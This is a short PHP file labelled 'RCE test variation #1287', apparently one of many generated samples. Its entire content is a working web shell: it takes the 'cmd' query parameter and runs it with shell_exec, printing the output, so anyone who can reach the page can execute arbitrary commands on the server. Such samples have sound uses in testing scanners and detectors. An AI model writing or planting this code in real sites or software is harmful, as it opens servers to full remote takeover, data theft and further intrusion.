<?php
// RCE test variation #1287
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>